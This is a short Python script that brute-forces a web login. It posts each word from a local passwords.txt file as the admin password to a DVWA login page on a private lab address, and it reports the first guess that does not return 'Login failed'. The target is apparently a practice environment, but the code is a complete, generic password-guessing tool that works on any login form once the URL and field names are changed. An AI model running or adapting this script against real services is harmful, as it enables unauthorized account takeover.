#!/bin/env/python

import requests

target_url = "http://192.168.56.34/dvwa/login.php" #Enter URL

data_dict = {
    'username': 'admin', 
    'password': '',
    'Login': 'submit'
    #Mention right inputs, go to inpect option and look for keywords
}


with open("passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Password found --> " + word)
            exit() 

print("[-] No luck, try next time..")

#have a passwords.txt file in the same directory